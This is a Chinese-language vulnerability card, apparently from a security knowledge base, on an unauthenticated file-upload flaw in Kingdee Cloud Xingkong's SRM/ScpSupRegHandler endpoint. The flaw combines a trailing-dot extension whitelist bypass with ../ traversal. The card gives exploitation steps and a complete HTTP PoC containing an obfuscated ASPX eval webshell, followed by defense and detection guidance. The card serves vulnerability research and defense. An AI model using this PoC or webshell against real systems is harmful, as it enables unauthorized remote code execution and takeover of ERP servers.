---
id: web-generic-file-upload-kingdee-scpsupreghandler-dot-traversal
title: 金蝶云星空 ScpSupRegHandler 尾点空后缀绕过与 ../ 目录穿越任意文件上传
type: scenario
domain: web
path: web/generic/file-upload
technique: kingdee-scpsupreghandler-trailing-dot-extension-traversal-upload
tags:
- file-upload
- kingdee
- erp
- iis
- dotnet
- path-traversal
- webshell
- windows
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
affected_versions: 金蝶云星空 V6.2（含 2017-12 补丁）至 V8.1（含 2023-09 补丁）
verification:
  verified_by: verifier-V556
  verified_at: '2026-11-12T00:15:09+08:00'
  notes: 已对照原文全文与34张截图核对：Common.config 路由 SRM/ScpSupRegHandler→ScpSupRegHandler（图27）、POST 且 Files.Count>0 直接 SaveAttach 无认证（图28）、GetExtension().Replace('.','').ToLower() 后白名单 Contains 空串恒真（图29）、FID>0 与 dbId_v 非空前置校验（图30）、MapPath('') 拼接 SupRegAttach 目录且原始文件名零过滤 SaveAs（图31）、../../../../uploadfiles/test.aspx. 尾点落地并经蚁剑连接成功（图32）、补丁后 ValidateWhiteList/TryCheckFileNamesValid 拒空扩展名与特殊字符（图34）均一致；影响版本 V6.2(含17年12月补丁)至V8.1(含23年9月补丁) 原文明确，已 set-versions。dedup 候选 EIS/JHSoft 为不同产品不同缺陷点，extension-zero-check/move_uploaded_file-trailing-dot/single-replace-dotdot-bypass 三张通用模式卡为关联而非同一链。PoC 未在本机执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-kingdee-scpsupreghandler-dot-traversal/
draft: false
kb_aliases:
- ScpSupRegHandler 任意文件上传
- 金蝶云星空 SRM 附件上传 GetExtension 尾点绕过
- 金蝶云星空 WebShell 上传
---

## 一句话结论

金蝶云星空 SRM 供应商注册附件上传接口 `SRM/ScpSupRegHandler` 的 `SaveAttach` 先把文件扩展名中的 `.` 全部去掉再用 `Contains` 做白名单判断，上传文件名以 `.` 结尾（如 `test.aspx.`）时扩展名变为空串，而空串被任何字符串 `Contains` 命中；随后代码把未经任何过滤的原始文件名直接拼进目录并 `SaveAs`，`../` 可穿越到 Web 目录，Windows 落盘时会剥离末尾的点，最终 `test.aspx.` 落地为可解析的 `test.aspx` WebShell。

## 原理

- 路由：`App_Data\Common.config` 把 `path="SRM/ScpSupRegHandler"` 映射到 `Kingdee.K3.SCM.SCP.Business.PlugIn.ScpSupRegHandler` 的 `ProcessRequest`；当请求为 POST 且 `Request.Files.Count > 0` 时直接调用 `SaveAttach`，无认证校验。
- 后缀白名单绕过：`SaveAttach` 中取 `Path.GetExtension(httpPostedFile.FileName).Replace(".", "").ToLower()`，再判断白名单字符串 `"txt,pdf,doc,docx,xls,xlsx,ppt,pptx,rft,jpg,png,bmp,gif,jpeg,rar,zip,dat,key,msg,cad,btw,avi,rmvb,wps,et,dps,vsd".Contains(text)`。.NET Framework 的 `Path.GetExtension` 对以 `.` 结尾的文件名返回空串（返回 `.` 时也会被 `Replace(".", "")` 清空），空串是任意字符串的子串，`Contains("")` 恒为 true，白名单被完全绕过。
- 前置参数：请求表单需提供 `FID`（解析为 long，必须 `> 0`，否则提前返回「附件保存参数异常」）与 `dbId_v`（必须非空，否则提前返回「获取账套ID失败」）；`dbId_v` 直接作为目录名的一部分。
- 目录构造与穿越：代码取 `Server.MapPath("")`（站点根）后 `Replace("SRM","")`，再拼出 `...\SRM\SupRegAttach\<dbId_v>\<FID>\` 并 `Directory.CreateDirectory`；最终 `text8 = text7 + "\\" + httpPostedFile.FileName; httpPostedFile.SaveAs(text8)`。原始文件名零过滤、零重命名，`../` 序列把落点从附件目录拉回 Web 根下的可访问目录，例如 `../../../../uploadfiles/test.aspx.`。
- 为什么末尾点会消失：Windows 文件系统在创建文件时会自动去除文件名末尾的点和空格，因此写入时名为 `test.aspx.` 的文件实际落地为 `test.aspx`，IIS 按 `.aspx` 交给 ASP.NET 解析，从而执行 WebShell 代码。
- 组合效果：一个未认证 POST 同时完成了「后缀检查绕过 + 目录穿越 + 重命名缺失 + IIS 脚本解析」，直接获得服务器权限。

## 触发条件

- 目标为受影响版本范围（V6.2 含 2017-12 补丁 至 V8.1 含 2023-09 补丁）的金蝶云星空，`/K3Cloud/SRM/ScpSupRegHandler` 可达。
- 无需登录（文中 PoC 未携带任何会话）；仅要求 IIS 站点对 `UploadFiles` 等目录有写权限（默认部署即满足）。
- 上传目录位于 Web 根下且允许脚本解析（默认部署即满足）。

## 利用步骤

1. 准备一个 multipart/form-data 请求，三个关键字段：
   - `dbId_v=.`（任意非空值，`.` 使目录拼接不报错）；
   - `FID=2024`（任意正整数）；
   - `file` 字段 `filename="../../../../uploadfiles/test.aspx."`，内容为 ASPX 一句话/蚁剑马。
2. POST 到 `/K3Cloud/SRM/ScpSupRegHandler`，服务端创建目录并 `SaveAs`，尾点被 Windows 剥离。
3. 访问 `/K3Cloud/UploadFiles/test.aspx`（即落地文件）验证解析，蚁剑连接执行命令。
4. 失败排查：若响应提示「附件保存参数异常」说明 FID ≤ 0；提示「获取账套ID失败」说明 `dbId_v` 为空；路径层级不对时增减 `../` 数量。

## PoC

```http
POST /K3Cloud/SRM/ScpSupRegHandler HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=--------------------------606727559931226829481104
Content-Length: 610

----------------------------606727559931226829481104
Content-Disposition: form-data; name="dbId_v"

.
----------------------------606727559931226829481104
Content-Disposition: form-data; name="FID"

2024
----------------------------606727559931226829481104
Content-Disposition: form-data; name="file"; filename="../../../../uploadfiles/test.aspx."
Content-Type: text/plain

<% function EE82o3kp(){var GEPH="unsa",YACK="fe",CO0C=GEPH+YACK;return CO0C;}var PAY:String=Request["123"];~eval/*Za61vZ34F4*/(PAY,EE82o3kp());%><%@Page Language = JS%>
----------------------------606727559931226829481104--
```

```text
# 预期：附件保存成功；随后 GET /K3Cloud/UploadFiles/test.aspx 返回 200
# 蚁剑等客户端可直接连接该 URL 执行命令
```

## 变体与关联

- 变体：只把 `../` 换成多级穿越可写入任意 Web 可写目录；文件名内容可换成任意 ASPX/ASHX 脚本。
- 变体：扩展名判断若改为返回 `.` 而非空串的 .NET 版本，同样被 `Replace(".", "")` 清空，绕过不依赖具体的 `GetExtension` 行为差异。
- 关联：[[web-generic-file-upload-extension-zero-check]]（空扩展名恒过白名单的同一类缺陷）、[[web-generic-file-upload-move-uploaded-file-trailing-dot]]（Windows 尾点落地特性）、[[web-generic-file-upload-single-replace-dotdot-bypass]]（`../` 过滤不彻底）。
- 关联：同产品 KDSVC 反序列化 RCE 卡 [[web-dotnet-deser-kingdee-kdsvc-binaryformatter-rce]]，两者常在同一目标上组合利用。

## 检测与防御

- 根治：升级到包含 `ValidateWhiteList` 的新版补丁。修复逻辑为：`Path.GetExtension(filename)` 结果为空或空白直接拒绝；文件名包含 `\ / : * ? " < > | ;` 任一字符即拒绝，从根上消除空后缀绕过与目录穿越。
- 加固：上传文件一律服务端重命名（UUID/时间戳 + 白名单扩展名），落点固定在上传目录并做 `GetFullPath` 前缀校验；上传目录禁止脚本执行（IIS 请求筛选/处理程序映射移除 aspx）。
- 加固：上传接口增加认证与业务权限校验，`dbId_v`/`FID` 等服务端参数不接受用户拼接路径。
- 检测：请求文件名包含 `../`、以点结尾或以空格结尾；`/K3Cloud/SRM/ScpSupRegHandler` 的 POST 后在 Web 目录出现新增 `.aspx/.ashx` 文件；IIS 日志中上传后紧跟对同目录脚本的访问。
- 检测：WAF 规则对 multipart `filename` 中的路径分隔符与尾点做拦截。
